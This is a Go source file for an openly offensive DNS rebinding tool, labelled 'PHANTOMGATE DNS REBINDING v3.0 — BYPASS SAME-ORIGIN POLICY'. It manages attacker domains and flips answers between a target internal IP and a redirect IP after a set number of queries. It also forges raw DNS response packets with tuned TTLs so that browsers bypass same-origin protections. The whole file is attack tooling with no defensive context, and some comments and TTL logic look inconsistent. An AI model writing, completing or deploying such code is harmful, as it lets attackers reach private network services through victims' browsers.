package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE DNS REBINDING v3.0 — BYPASS SAME-ORIGIN POLICY
// ══════════════════════════════════════════════════════════════════════════════

type RebindingAttacker struct {
	iface       string
	redirectIP  net.IP
	targetIP    net.IP
	running     bool
	stopChan    chan struct{}
	
	// Rebinding state
	domains     map[string]*RebindDomain
	domainsMu   sync.RWMutex
	
	// Statistics
	stats       *RebindStats
	
	// Configuration
	config      *RebindConfig
}

type RebindDomain struct {
	Domain      string
	InternalIP  net.IP
	ExternalIP  net.IP
	TTL         uint32
	Queries     int64
	LastQuery   time.Time
}

type RebindStats struct {
	QueriesHandled int64
	BindingsSwitched int64
	StartTime      time.Time
}

type RebindConfig struct {
	Interface    string
	RedirectIP   string
	TargetIP     string
	TTL          uint32
	MaxTTL       uint32
	MinTTL       uint32
	SwitchAfter  int // Switch IP after N queries
}

func NewRebindingAttacker(cfg RebindConfig) (*RebindingAttacker, error) {
	if cfg.TTL == 0 {
		cfg.TTL = 1
	}
	if cfg.MaxTTL == 0 {
		cfg.MaxTTL = 300
	}
	if cfg.MinTTL == 0 {
		cfg.MinTTL = 1
	}
	if cfg.SwitchAfter == 0 {
		cfg.SwitchAfter = 2
	}
	
	redirectIP := net.ParseIP(cfg.RedirectIP).To4()
	if redirectIP == nil {
		return nil, fmt.Errorf("invalid redirect IP: %s", cfg.RedirectIP)
	}
	
	targetIP := net.ParseIP(cfg.TargetIP).To4()
	if targetIP == nil {
		return nil, fmt.Errorf("invalid target IP: %s", cfg.TargetIP)
	}
	
	return &RebindingAttacker{
		iface:      cfg.Interface,
		redirectIP: redirectIP,
		targetIP:   targetIP,
		stopChan:   make(chan struct{}),
		domains:    make(map[string]*RebindDomain),
		config:     &cfg,
		stats: &RebindStats{
			StartTime: time.Now(),
		},
	}, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (r *RebindingAttacker) Start() error {
	r.running = true
	
	log.Printf("[REBIND] Starting DNS rebinding attacker")
	log.Printf("[REBIND] Redirect IP: %s", r.redirectIP)
	log.Printf("[REBIND] Target IP: %s", r.targetIP)
	log.Printf("[REBIND] Switch after: %d queries", r.config.SwitchAfter)
	
	return nil
}

func (r *RebindingAttacker) Stop() {
	r.running = false
	close(r.stopChan)
	
	r.printStats()
	log.Printf("[REBIND] DNS rebinding attacker stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// DOMAIN MANAGEMENT
// ══════════════════════════════════════════════════════════════════════════════

func (r *RebindingAttacker) AddDomain(domain string) {
	r.domainsMu.Lock()
	defer r.domainsMu.Unlock()
	
	r.domains[domain] = &RebindDomain{
		Domain:     domain,
		InternalIP: r.targetIP,
		ExternalIP: r.redirectIP,
		TTL:        r.config.TTL,
	}
	
	log.Printf("[REBIND] Added domain: %s", domain)
}

func (r *RebindingAttacker) RemoveDomain(domain string) {
	r.domainsMu.Lock()
	defer r.domainsMu.Unlock()
	
	delete(r.domains, domain)
	log.Printf("[REBIND] Removed domain: %s", domain)
}

func (r *RebindingAttacker) GetDomain(domain string) *RebindDomain {
	r.domainsMu.RLock()
	defer r.domainsMu.RUnlock()
	
	return r.domains[domain]
}

// ══════════════════════════════════════════════════════════════════════════════
// REBINDING LOGIC
// ══════════════════════════════════════════════════════════════════════════════

func (r *RebindingAttacker) HandleQuery(domain string) net.IP {
	r.domainsMu.Lock()
	defer r.domainsMu.Unlock()
	
	d, exists := r.domains[domain]
	if !exists {
		return nil
	}
	
	atomic.AddInt64(&d.Queries, 1)
	atomic.AddInt64(&r.stats.QueriesHandled, 1)
	d.LastQuery = time.Now()
	
	// Determine which IP to return
	var responseIP net.IP
	if d.Queries%int64(r.config.SwitchAfter) == 0 {
		// Switch to external IP (bypasses same-origin)
		responseIP = make(net.IP, 4)
		copy(responseIP, d.ExternalIP)
		atomic.AddInt64(&r.stats.BindingsSwitched, 1)
		log.Printf("[REBIND] %s → %s (external)", domain, responseIP)
	} else {
		// Return internal IP (same-origin with attacker's JS)
		responseIP = make(net.IP, 4)
		copy(responseIP, d.InternalIP)
		log.Printf("[REBIND] %s → %s (internal)", domain, responseIP)
	}
	
	return responseIP
}

func (r *RebindingAttacker) ShouldRebind(domain string) bool {
	r.domainsMu.RLock()
	defer r.domainsMu.RUnlock()
	
	d, exists := r.domains[domain]
	if !exists {
		return false
	}
	
	return d.Queries%int64(r.config.SwitchAfter) == 0
}

// ══════════════════════════════════════════════════════════════════════════════
// DNS RESPONSE FORGERY
// ══════════════════════════════════════════════════════════════════════════════

func (r *RebindingAttacker) ForgeResponse(query []byte, responseIP net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	
	txnID := binary.BigEndian.Uint16(query[0:2])
	qdCount := binary.BigEndian.Uint16(query[4:6])
	
	if qdCount == 0 {
		return nil
	}
	
	// Parse query name
	queryName, queryEnd := parseDNSNameSimple(query, 12)
	if queryName == "" || queryEnd+4 > len(query) {
		return nil
	}
	
	// Copy question section
	questionSection := query[12:queryEnd+4]
	
	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)
	
	// DNS Header
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], txnID)
	binary.BigEndian.PutUint16(header[2:4], 0x8180) // Response, Authoritative
	binary.BigEndian.PutUint16(header[4:6], 1)       // Questions
	binary.BigEndian.PutUint16(header[6:8], 1)       // Answers
	resp = append(resp, header...)
	
	// Question section
	resp = append(resp, questionSection...)
	
	// Answer section
	ttl := r.config.TTL
	if r.ShouldRebind(queryName) {
		ttl = r.config.MinTTL // Low TTL for fast switching
	} else {
		ttl = r.config.MaxTTL // High TTL for caching
	}
	
	answer := make([]byte, 16)
	binary.BigEndian.PutUint16(answer[0:2], 0xC00C) // Name pointer
	binary.BigEndian.PutUint16(answer[2:4], 1)       // Type A
	binary.BigEndian.PutUint16(answer[4:6], 1)       // Class IN
	binary.BigEndian.PutUint32(answer[6:10], ttl)
	binary.BigEndian.PutUint16(answer[10:12], 4)     // Data length
	copy(answer[12:16], responseIP.To4())
	resp = append(resp, answer...)
	
	return resp
}

func parseDNSNameSimple(packet []byte, offset int) (string, int) {
	var parts []string
	pos := offset
	
	for pos < len(packet) {
		length := int(packet[pos])
		if length == 0 {
			pos++
			break
		}
		
		// Compression pointer
		if length&0xC0 == 0xC0 {
			return strings.Join(parts, "."), pos + 2
		}
		
		pos++
		if pos+length > len(packet) {
			return "", -1
		}
		
		parts = append(parts, string(packet[pos:pos+length]))
		pos += length
	}
	
	return strings.Join(parts, "."), pos
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func (r *RebindingAttacker) GetDomains() []*RebindDomain {
	r.domainsMu.RLock()
	defer r.domainsMu.RUnlock()
	
	domains := make([]*RebindDomain, 0, len(r.domains))
	for _, d := range r.domains {
		domains = append(domains, d)
	}
	return domains
}

func (r *RebindingAttacker) printStats() {
	log.Printf("[REBIND STATS] Queries: %d | Bindings switched: %d",
		atomic.LoadInt64(&r.stats.QueriesHandled),
		atomic.LoadInt64(&r.stats.BindingsSwitched))
}

// RandomIP generates a random IP for testing
func RandomIP() net.IP {
	return net.IP{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
}
